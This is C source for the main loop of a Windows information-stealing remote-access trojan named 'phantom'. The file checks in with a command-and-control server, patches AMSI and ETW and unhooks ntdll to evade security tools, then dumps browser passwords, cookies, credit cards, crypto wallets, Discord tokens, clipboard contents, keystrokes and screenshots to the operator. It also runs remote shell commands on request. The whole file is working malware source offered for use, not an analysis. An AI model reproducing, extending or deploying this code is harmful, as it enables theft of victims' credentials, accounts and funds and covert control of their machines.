/*
 * phantom_main.c — HTTP/mTLS C2 poll loop
 *
 * On startup: check-in push, then poll every C2_POLL_MS ± jitter.
 * Commands dispatched by operator via dashboard, results acked back.
 * Data events (screenshot, browser, crypto…) pushed before ack.
 *
 * Feature flags (pass -DHAVE_X at compile time):
 *   HAVE_KEYLOGGER  — keylogger_start/stop, CMD_FLUSH_KEYLOG
 *   HAVE_CLIPJACK   — clipboard hijack thread
 *   HAVE_SCREENSHOT — screenshot capture, CMD_SCREENSHOT
 *   HAVE_BROWSER    — credential/cookie/CC dump, browser watcher thread
 *   HAVE_CRYPTO     — crypto wallet scanner
 *   HAVE_DISCORD    — Discord token stealer
 *   HAVE_CLIPBOARD  — clipboard snapshot
 *   HAVE_SHELL      — CMD_SHELL remote command exec
 */

#include "c2_client.h"
#include "commands.h"
#include "evasion.h"
#include "phantom_config.h"
#include "evs_strings.h"

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef PHANTOM_DEBUG
#define DBG(fmt, ...) fprintf(stderr, "[ph] " fmt "\n", ##__VA_ARGS__)
#else
#define DBG(fmt, ...) ((void)0)
#endif

#define OUT_SZ (4 * 1024 * 1024)

/* ── machine info helpers ── */

static void _get_os(char *out, size_t sz)
{
    OSVERSIONINFOEXA vi;
    memset(&vi, 0, sizeof(vi));
    vi.dwOSVersionInfoSize = sizeof(vi);
    typedef BOOL (WINAPI *_fGVE_t)(LPOSVERSIONINFOA);
    HMODULE hK = GetModuleHandleA("kernel32.dll");
    _fGVE_t fGVE = hK ? (_fGVE_t)(void*)GetProcAddress(hK, "GetVersionExA") : NULL;
    if (fGVE) fGVE((LPOSVERSIONINFOA)&vi);
    const char *name = (vi.dwMajorVersion == 10 && vi.dwBuildNumber >= 22000)
                       ? "11" : "10";
    snprintf(out, sz, "Windows %s build %lu", name,
             (unsigned long)vi.dwBuildNumber);
}

/* ── screenshot helper (b64 → raw BMP) ── */

#ifdef HAVE_SCREENSHOT
extern uint8_t *base64_decode(const char *in, size_t *out_len);

static int _push_screenshot(const char *host, const char *user,
                             const char *os_ver)
{
    size_t sc_sz = 10 * 1024 * 1024;
    char *sc_buf = (char *)malloc(sc_sz);
    if (!sc_buf) return -1;
    sc_buf[0] = '\0';

    int rc = cmd_screenshot(sc_buf, sc_sz);
    int ret = -1;

    if (rc == 0 && sc_buf[0] == 's') {
        char *b64 = strchr(sc_buf, '\n');
        if (b64) {
            b64++;
            size_t bmp_len = 0;
            uint8_t *bmp = base64_decode(b64, &bmp_len);
            if (bmp && bmp_len) {
                c2_push(EVT_SCREENSHOT, host, user, os_ver,
                        bmp, (uint32_t)bmp_len);
                ret = 0;
            }
            free(bmp);
        }
    }
    free(sc_buf);
    return ret;
}
#endif /* HAVE_SCREENSHOT */

/* ── clipjack thread ── */

#ifdef HAVE_CLIPJACK
static DWORD WINAPI _clipjack_thread(LPVOID p)
{
    (void)p;
    char buf[4096];
#ifdef CLIPJACK_AUTOADDR
    {
        char args[512] = "start ";
        char tmp[256];
        snprintf(tmp, sizeof(tmp), "%s", CLIPJACK_AUTOADDR);
        for (char *ch = tmp; *ch; ch++) if (*ch == ',') *ch = ' ';
        strncat(args, tmp, sizeof(args) - strlen(args) - 1);
        cmd_clipjack(args, buf, sizeof(buf));
    }
#else
    cmd_clipjack(NULL, buf, sizeof(buf));
#endif
    return 0;
}
#endif /* HAVE_CLIPJACK */

/* ── browser-open watcher ── */

#ifdef HAVE_BROWSER
/*
 * Background thread: detects browser launch via visible window edge-detection.
 * Immune to chrome.exe background helpers/crash handlers (no visible window).
 * Poll every 5s, triggers on false→true window presence transition.
 */

#define BW_POLL_MS   5000
#define BW_WARMUP_MS 8000

typedef struct {
    char     host[64];
    char     user[64];
    char     os_ver[64];
    volatile LONG running;
} _bw_ctx_t;

static BOOL CALLBACK _bw_enum_cb(HWND hwnd, LPARAM lp)
{
    if (!IsWindowVisible(hwnd)) return TRUE;
    char cls[64] = {0};
    GetClassNameA(hwnd, cls, sizeof(cls));
    if (strncmp(cls, "Chrome_WidgetWin_", 17) == 0 ||
        strcmp(cls, "MozillaWindowClass") == 0) {
        *(int *)lp = 1;
        return FALSE;
    }
    return TRUE;
}

static int _has_browser_window(void)
{
    int found = 0;
    EnumWindows(_bw_enum_cb, (LPARAM)&found);
    return found;
}

static DWORD WINAPI _browser_watch_thread(LPVOID p)
{
    _bw_ctx_t *ctx = (_bw_ctx_t *)p;

    int was_open = _has_browser_window();

    char *buf = (char *)calloc(1, OUT_SZ);
    if (!buf) return 1;

    while (InterlockedCompareExchange(&ctx->running, 1, 1)) {
        Sleep(BW_POLL_MS);
        if (!InterlockedCompareExchange(&ctx->running, 1, 1)) break;

        int now_open = _has_browser_window();

        if (!was_open && now_open) {
            was_open = now_open;

            Sleep(BW_WARMUP_MS);
            if (!InterlockedCompareExchange(&ctx->running, 1, 1)) break;

#ifdef HAVE_SCREENSHOT
            _push_screenshot(ctx->host, ctx->user, ctx->os_ver);
#endif

            /* passwords — retry up to 3x until v20 key found */
            for (int _att = 0; _att < 3; _att++) {
                if (_att > 0) {
                    for (int _w = 0; _w < 12; _w++) {
                        if (!InterlockedCompareExchange(&ctx->running, 1, 1)) goto _bw_done;
                        Sleep(BW_POLL_MS);
                    }
                    if (!InterlockedCompareExchange(&ctx->running, 1, 1)) goto _bw_done;
                    if (!_has_browser_window()) break;
                }
                buf[0] = '\0';
                cmd_browser_dump(NULL, buf, OUT_SZ);
                if (buf[0])
                    c2_push(EVT_BROWSER, ctx->host, ctx->user, ctx->os_ver,
                            buf, (uint32_t)strlen(buf));
                if (buf[0]) {
                    char *ch = strstr(buf, "[Chrome v20: ");
                    if (ch && (strstr(ch, "dpapi_ok]") ||
                               strstr(ch, "memscan=OK]") ||
                               (strstr(ch, "found=1") && strchr(ch, ']') &&
                                strstr(ch, "found=1") < strchr(ch, ']'))))
                        break;
                }
            }

#ifdef HAVE_CRYPTO
            buf[0] = '\0';
            cmd_crypto_dump(NULL, buf, OUT_SZ);
            if (buf[0])
                c2_push(EVT_CRYPTO, ctx->host, ctx->user, ctx->os_ver,
                        buf, (uint32_t)strlen(buf));
#endif

#ifdef HAVE_CLIPBOARD
            buf[0] = '\0';
            cmd_clipboard_dump(NULL, buf, OUT_SZ);
            if (buf[0])
                c2_push(EVT_CLIPBOARD, ctx->host, ctx->user, ctx->os_ver,
                        buf, (uint32_t)strlen(buf));
#endif

            buf[0] = '\0';
        } else {
            was_open = now_open;
        }
    }
_bw_done:
    SecureZeroMemory(buf, OUT_SZ);
    free(buf);
    return 0;
}
#endif /* HAVE_BROWSER */

/* ── main run ── */

static void _run(void)
{
    DBG("_run start");
    char *buf = (char *)calloc(1, OUT_SZ);
    if (!buf) { DBG("calloc failed"); return; }

    char host[64] = {0}, user[64] = {0}, os_str[64] = {0};
#ifdef HAVE_BROWSER
    HANDLE h_bw = NULL;   /* init before any goto so done: is safe */
    static _bw_ctx_t bw_ctx;
#endif

    {
        HMODULE _k = GetModuleHandleA("kernel32.dll");
        if (_k) {
            char _fn[17]; EVS_D(_fn, EVS_fn_GetComputerNameA);
            typedef BOOL (WINAPI *_GCN_t)(LPSTR, LPDWORD);
            _GCN_t _gcn = (_GCN_t)(void*)GetProcAddress(_k, _fn);
            SecureZeroMemory(_fn, sizeof(_fn));
            DWORD _n = (DWORD)sizeof(host); if (_gcn) _gcn(host, &_n);
        }
    }
    DWORD n = 64; GetUserNameA(user, &n);
    _get_os(os_str, sizeof(os_str));

    if (c2_init() != 0) { goto done; }
    c2_set_identity(host, user);

    /* post-connect evasion — only runs when C2 is reachable */
#ifndef SKIP_EVASION
    evasion_stomp_header();
    evasion_unhook_ntdll();
    evasion_patch_etw();
    evasion_patch_amsi();
    evasion_patch_etw_ti();
#ifdef HAVE_CLIPJACK
    { HANDLE _hcj = CreateThread(NULL, 0, _clipjack_thread, NULL, 0, NULL);
      if (_hcj) CloseHandle(_hcj); }
#endif
#else
    DBG("evasion SKIPPED (SKIP_EVASION defined)");
#endif

#ifdef HAVE_BROWSER
    memset(&bw_ctx, 0, sizeof(bw_ctx));
    strncpy(bw_ctx.host,   host,   sizeof(bw_ctx.host)   - 1);
    strncpy(bw_ctx.user,   user,   sizeof(bw_ctx.user)   - 1);
    strncpy(bw_ctx.os_ver, os_str, sizeof(bw_ctx.os_ver) - 1);
    InterlockedExchange(&bw_ctx.running, 1);
    h_bw = CreateThread(NULL, 0, _browser_watch_thread, &bw_ctx, 0, NULL);
#endif

    c2_push(EVT_CHECKIN, host, user, os_str, NULL, 0);
    DBG("checked in as %s / %s", host, user);

    srand((unsigned)GetTickCount() ^ (unsigned)GetCurrentProcessId());

    /* ── auto-dump on first run ── */
    {
#ifdef HAVE_SCREENSHOT
        _push_screenshot(host, user, os_str);
#endif

#ifdef HAVE_BROWSER
        buf[0] = '\0';
        cmd_browser_dump(NULL, buf, OUT_SZ);
        if (buf[0])
            c2_push(EVT_BROWSER, host, user, os_str, buf, (uint32_t)strlen(buf));

        buf[0] = '\0';
        cmd_browser_cc(NULL, buf, OUT_SZ);
        if (buf[0])
            c2_push(EVT_CC, host, user, os_str, buf, (uint32_t)strlen(buf));

        buf[0] = '\0';
        cmd_browser_cookies(NULL, buf, OUT_SZ);
        if (buf[0])
            c2_push(EVT_COOKIES, host, user, os_str, buf, (uint32_t)strlen(buf));
#endif

#ifdef HAVE_CRYPTO
        buf[0] = '\0';
        cmd_crypto_dump(NULL, buf, OUT_SZ);
        if (buf[0])
            c2_push(EVT_CRYPTO, host, user, os_str, buf, (uint32_t)strlen(buf));
#endif

#ifdef HAVE_DISCORD
        buf[0] = '\0';
        cmd_discord_tokens(NULL, buf, OUT_SZ);
        if (buf[0])
            c2_push(EVT_DISCORD, host, user, os_str, buf, (uint32_t)strlen(buf));
#endif

#ifdef HAVE_CLIPBOARD
        buf[0] = '\0';
        cmd_clipboard_dump(NULL, buf, OUT_SZ);
        if (buf[0])
            c2_push(EVT_CLIPBOARD, host, user, os_str, buf, (uint32_t)strlen(buf));
#endif

        buf[0] = '\0';
        DBG("initial dump complete");
    }

    /* ── poll loop ── */
    for (;;) {
        c2_cmd_t cmds[C2_MAX_CMDS];
        memset(cmds, 0, sizeof(cmds));
        int nc = c2_poll(cmds, C2_MAX_CMDS);
        DBG("poll -> %d cmds", nc);

        for (int i = 0; i < nc; i++) {
            c2_cmd_t *cmd = &cmds[i];
            DBG("cmd type=0x%02x payload=%u", cmd->type, cmd->payload_len);

            switch (cmd->type) {

#ifdef HAVE_SHELL
            case CMD_SHELL: {
                char *out = (char *)calloc(1, OUT_SZ);
                if (out) {
                    const char *cmdline = cmd->payload_len
                        ? (const char *)cmd->payload : "";
                    cmd_shell(cmdline, out, OUT_SZ);
                    uint32_t rlen = out[0] ? (uint32_t)strlen(out) : 0;
                    c2_ack(cmd->uuid, rlen ? ACK_OK : ACK_FAIL, out, rlen);
                    SecureZeroMemory(out, OUT_SZ);
                    free(out);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                break;
            }
#endif /* HAVE_SHELL */

#ifdef HAVE_SCREENSHOT
            case CMD_SCREENSHOT: {
                int ok = _push_screenshot(host, user, os_str);
                c2_ack(cmd->uuid, ok == 0 ? ACK_OK : ACK_FAIL, NULL, 0);
                break;
            }
#endif /* HAVE_SCREENSHOT */

#ifdef HAVE_BROWSER
            case CMD_BROWSER_DUMP: {
                buf[0] = '\0';
                cmd_browser_dump(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_BROWSER, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }
#endif /* HAVE_BROWSER */

#ifdef HAVE_CLIPBOARD
            case CMD_CLIPBOARD: {
                buf[0] = '\0';
                cmd_clipboard_dump(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_CLIPBOARD, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }
#endif /* HAVE_CLIPBOARD */

            case CMD_PROC_LIST: {
                buf[0] = '\0';
                cmd_ps(buf, OUT_SZ);
                uint32_t rlen = buf[0] ? (uint32_t)strlen(buf) : 0;
                c2_ack(cmd->uuid, rlen ? ACK_OK : ACK_FAIL, buf, rlen);
                buf[0] = '\0';
                break;
            }

#ifdef HAVE_KEYLOGGER
            case CMD_FLUSH_KEYLOG: {
                if (!keylogger_is_active()) keylogger_start();
                buf[0] = '\0';
                int got = keylogger_get(buf, OUT_SZ - 1);
                if (got > 0) {
                    c2_push(EVT_KEYLOG, host, user, os_str,
                            buf, (uint32_t)got);
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }
#endif /* HAVE_KEYLOGGER */

#ifdef HAVE_DISCORD
            case CMD_DISCORD_DUMP: {
                buf[0] = '\0';
                cmd_discord_tokens(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_DISCORD, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }
#endif /* HAVE_DISCORD */

            case CMD_DUMP_ALL: {
                int pushed = 0;
#ifdef HAVE_SCREENSHOT
                if (_push_screenshot(host, user, os_str) == 0) pushed++;
#endif
#ifdef HAVE_BROWSER
                buf[0] = '\0';
                cmd_browser_dump(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_BROWSER, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    pushed++;
                }
                buf[0] = '\0';
                cmd_browser_cc(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_CC, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    pushed++;
                }
                buf[0] = '\0';
                cmd_browser_cookies(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_COOKIES, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    pushed++;
                }
#endif
#ifdef HAVE_CRYPTO
                buf[0] = '\0';
                cmd_crypto_dump(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_CRYPTO, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    pushed++;
                }
#endif
#ifdef HAVE_DISCORD
                buf[0] = '\0';
                cmd_discord_tokens(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_DISCORD, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    pushed++;
                }
#endif
#ifdef HAVE_CLIPBOARD
                buf[0] = '\0';
                cmd_clipboard_dump(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_CLIPBOARD, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    pushed++;
                }
#endif
                c2_ack(cmd->uuid, pushed > 0 ? ACK_OK : ACK_FAIL, NULL, 0);
                buf[0] = '\0';
                break;
            }

#ifdef HAVE_BROWSER
            case CMD_COOKIES_DUMP: {
                buf[0] = '\0';
                cmd_browser_cookies(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_COOKIES, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }

            case CMD_CC_DUMP: {
                buf[0] = '\0';
                cmd_browser_cc(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_CC, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }
#endif /* HAVE_BROWSER */

#ifdef HAVE_CRYPTO
            case CMD_CRYPTO_DUMP: {
                buf[0] = '\0';
                cmd_crypto_dump(NULL, buf, OUT_SZ);
                if (buf[0]) {
                    c2_push(EVT_CRYPTO, host, user, os_str,
                            buf, (uint32_t)strlen(buf));
                    c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                } else {
                    c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                }
                buf[0] = '\0';
                break;
            }
#endif /* HAVE_CRYPTO */

            case CMD_SELF_DESTRUCT:
                c2_ack(cmd->uuid, ACK_OK, NULL, 0);
                c2_cmd_free(cmd);
                goto done;

            default:
                c2_ack(cmd->uuid, ACK_FAIL, NULL, 0);
                break;
            }

            c2_cmd_free(cmd);
        }

        /* jitter sleep */
        DWORD base   = (DWORD)C2_POLL_MS;
        DWORD jitter = (DWORD)((base * JITTER_PCT / 100)
                                * ((double)rand() / RAND_MAX));
        DWORD sign   = rand() & 1;
        DWORD sleep_ms = sign ? base + jitter : (base > jitter ? base - jitter : base);
        Sleep(sleep_ms);
    }

done:
#ifdef HAVE_BROWSER
    InterlockedExchange(&bw_ctx.running, 0);
    if (h_bw) { WaitForSingleObject(h_bw, 3000); CloseHandle(h_bw); }
#endif
    c2_untrust_ca();
#ifndef SKIP_EVASION
#ifdef HAVE_KEYLOGGER
    keylogger_stop();
#endif
#endif
    SecureZeroMemory(buf, OUT_SZ);
    free(buf);
}

#ifdef _REFLECTIVE_DLL
void agent_main(void) { _run(); }
#else
int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nC)
{
    (void)hI; (void)hP; (void)lp; (void)nC;
    _run();
    return 0;
}
#endif
